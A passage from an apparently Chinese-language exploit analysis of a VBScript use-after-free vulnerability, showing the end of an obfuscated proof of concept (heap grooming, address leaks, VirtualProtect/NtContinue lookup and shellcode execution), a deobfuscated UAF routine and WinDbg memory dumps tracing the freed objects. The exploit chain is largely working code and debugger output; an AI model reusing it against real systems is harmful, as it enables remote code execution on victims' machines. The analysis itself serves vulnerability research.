        For IIIl=(&haa1+6236-&H22e9) To (&h1437+3036-&H1fed)
            Set IIllI(IIIl)=New llIIl
        Next
        IllI=0
        For IIIl=0 To 6
            ReDim lIIl(1)
            Set lIIl(1)=New cla1
            Erase lIIl
        Next
        Set llll=New llIIl
        IllI=0
        For IIIl=0 To 6
            ReDim lIIl(1)
            Set lIIl(1)=New cla2
            Erase lIIl
        Next
        Set IIIIl=New llIIl
    End Sub
    Sub InitObjects
        llll.SetProp(llllIl)
        IIIIl.SetProp(IlIIII)
        IlII=IIIIl.mem
    End Sub
    Sub StartExploit
        UAF
        InitObjects
        vb_adrr=LeakVBAddr()
        vbs_base=GetBaseByDOSmodeSearch(GetUint32(vb_adrr))
        msv_base=GetBaseFromImport(vbs_base,"msvcrt.dll")
        krb_base=GetBaseFromImport(msv_base,"kernelbase.dll")
        ntd_base=GetBaseFromImport(msv_base,"ntdll.dll")
        VirtualProtectAddr=GetProcAddr(krb_base,"VirtualProtect")
        NtContinueAddr=GetProcAddr(ntd_base,"NtContinue")
        SetMemValue GetShellcode()
        ShellcodeAddr=GetMemValue()+8
        SetMemValue WrapShellcodeWithNtContinueContext(ShellcodeAddr)
        lIlll=GetMemValue()+69596
        SetMemValue ExpandWithVirtualProtect(lIlll)
        llIIll=GetMemValue()
        Alert "Executing Shellcode"
        ExecuteShellcode
    End Sub
    StartExploit
可以看到原始的POC在变量名和数据计算中存在大量的混淆，下面我们会对比较关键的函数进行还原。
首先就是分析PoC中的UAF函数：
    '申请空间，占位
    Sub UAF
        Alert "UAF"
      For i=0 To 19
        Set array(i)=New Foo            '占据系统堆碎片
      Next
      For i=20 To 39
        Set array(i)=New cla4 '占据系统堆碎片
      Next
      spec_int_2=0
      For i=0 To 6
        ReDim array_a(1) 
        Set array_a(1)=New Trigger
        Erase array_a 'array_b保存了对已经释放的Trigger obj的引用
      Next
      IsEmpty(array_b) '引用计数为0时为什么没有调用release 完全释放类对象
      Set cla4_obj1=New cla4 '同时 cla4_obj1 对它占位
      IsEmpty(cla4_obj1)
      spec_int_2=0
      For i=0 To 6
        ReDim array_a(1)
        Set array_a(1)=New cla2 'array_c保存了对已经释放的 cla2 obj 的引用
        Erase array_a 
      Next
      IsEmpty(array_c)
      Set cla4_obj2=New cla4 '同时 cla4_obj2 对它占位
      IsEmpty(cla4_obj2)
    End Sub
第一次的IsEmpty断点，参数为array_b:
    Breakpoint 0 hit
    eax=6dd4185c ebx=0257d04c ecx=6dd9a9d8 edx=0257cfc4 esi=01d75424 edi=00000001
    eip=6dd5c206 esp=0257cee0 ebp=0257cef0 iopl=0     nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000       efl=00000246
    vbscript!VbsIsEmpty:
    6dd5c206 8bff       mov   edi,edi
    0:005> dd poi(esp+c)
    0049ec10  0000600c 00000000 01d811e8 002e1ef0 //2e1efo是array_b的data buffer
    0049ec20  02570002 0049df00 00490013 0257cea8
    0049ec30  02570002 0049df00 00490001 0257cea8
    0049ec40  6dd40002 0257cee4 02570027 0049df00
    0049ec50  6dd40002 0257cee4 02570001 0049df00
    0049ec60  6dd40002 0257cee4 02570006 0049df00
    0049ec70  6dd40002 0257cee4 02570001 0049df00
    0049ec80  00000000 00000000 00000000 00000000
    0:005> dd 2e1ef0
    002e1ef0  08920001 00000010 00000000 0031b348 // 0031b348是array_b数据元素地址
    002e1f00  00000007 00000000 1f784f23 88000000
    002e1f10  67ef2010 00000003 00000008 00000000
    002e1f20  00000000 002d8f40 00000052 80006200
    002e1f30  00000004 002c1b30 1f784f25 8800f812
    002e1f40  73a8c9c4 00000001 002ba2d0 ffffffff
    002e1f50  00000000 00000000 00000000 00000000
    002e1f60  02000001 73a8bec4 1f784f2f 80000848
    0:005> dd 31b348
    0031b348  00000009 00000000 01d82388 00000000 //01d82388是类对象地址
    0031b358  6dd40009 01d8238c 01d82388 6dd44211
    0031b368  6dd40009 01d8238c 01d82388 6dd44211
    0031b378  6dd40009 01d8238c 01d82388 6dd44211
    0031b388  6dd40009 01d8238c 01d82388 6dd44211
    0031b398  6dd40009 01d8238c 01d82388 6dd44211
    0031b3a8  6dd40009 01d8238c 01d82388 6dd44211
    0031b3b8  1f7bbbb5 88000000 00000000 00000000
    0:005> dd 1d82388
    01d82388  6dd400c6 00000000 00000000 00000000 //引用计数为0
    01d82398  000001a8 00000000 00000000 01d5b7ac
    01d823a8  00000001 002ba02c 00000000 00000000
    01d823b8  1f487ea5 80000000 000000cd 00000000
    01d823c8  00000000 00000000 00000000 00000000
    01d823d8  00000000 00000000 00000000 00000000
    01d823e8  00000000 00000000 1f487eac 80000000
    01d823f8  000000d4 00000000 00000000 00000000
    0:005> du 2ba02c
    002ba02c  "Trigger"
再运行到第二次IsEmpty断点，此时cla4_obj1占位已经完成：
    0:005> g
    Breakpoint 0 hit
    eax=6dd4185c ebx=0257d04c ecx=6dd9a9d8 edx=0257cfc4 esi=01d75424 edi=00000001
    eip=6dd5c206 esp=0257cee0 ebp=0257cef0 iopl=0     nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000       efl=00000246
    vbscript!VbsIsEmpty:
    6dd5c206 8bff       mov   edi,edi
    0:005> dd 1d82388
    01d82388  6dd41748 00000002 01d593f0 0049ff68 //引用计数变成2
    01d82398  000001a8 00000000 00000000 00000000
    01d823a8  00000000 002ba02c 00000000 01d82350
    01d823b8  1f487ea5 80000000 000000cd 00000000
    01d823c8  00000000 00000000 00000000 00000000
    01d823d8  00000000 00000000 00000000 00000000
    01d823e8  00000000 00000000 1f487eac 80000000
    01d823f8  000000d4 00000000 00000000 00000000
    0:005> du 2ba02c
    002ba02c  "cla4" //同样的地址cla4_obj1已经占位
    第三次IsEmpty断点，参数为array_c:
    0:005> g
    Breakpoint 0 hit
    eax=6dd4185c ebx=0257d04c ecx=6dd9a9d8 edx=0257cfc4 esi=01d75424 edi=00000001
    eip=6dd5c206 esp=0257cee0 ebp=0257cef0 iopl=0     nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000       efl=00000246
    vbscript!VbsIsEmpty:
    6dd5c206 8bff       mov   edi,edi
    0:005> dd poi(esp+c)
    0049ec10  0000600c 00000000 01d81228 002e1e00 //002e1e00是array_c的data buffer
    0049ec20  02570002 0049df00 00490013 0257cea8
    0049ec30  02570002 0049df00 00490001 0257cea8
    0049ec40  6dd40002 0257cee4 02570027 0049df00
    0049ec50  6dd40002 0257cee4 02570001 0049df00
    0049ec60  6dd40002 0257cee4 02570006 0049df00
    0049ec70  6dd40002 0257cee4 02570001 0049df00
    0049ec80  6dd40002 0257cee4 02570006 0049df00
    0:005> dd 2e1e00 //0031b3c0是array_c数据元素地址
    002e1e00  08920001 00000010 00000000 0031b3c0
    002e1e10  00000007 00000000 1f784f01 88000400
    002e1e20  682fbdc8 00000000 67f95d74 002c66b8
    002e1e30  67f95b60 00000000 00000000 00000000
    002e1e40  03000004 00000000 1f784f0b 8c006f00
    002e1e50  67f73928 00000001 00000008 00000000
    002e1e60  00000000 002c1b30 00326c70 00000000
    002e1e70  00000000 67f8e200 1f784f0d 88006000
    0:005> dd 31b3c0 
    0031b3c0  6dd40009 01d8238c 01d823c0 6dd44211 //01d823c0是类对象地址
    0031b3d0  6dd40009 01d823c4 01d823c0 6dd44211
    0031b3e0  6dd40009 01d823c4 01d823c0 6dd44211
    0031b3f0  6dd40009 01d823c4 01d823c0 6dd44211
    0031b400  6dd40009 01d823c4 01d823c0 6dd44211
    0031b410  6dd40009 01d823c4 01d823c0 6dd44211
    0031b420  6dd40009 01d823c4 01d823c0 6dd44211
    0031b430  1f7bbb44 80000000 00000098 00690066
    0:005> dd 1d823c0
    01d823c0  6dd400cd 00000000 00000000 00000000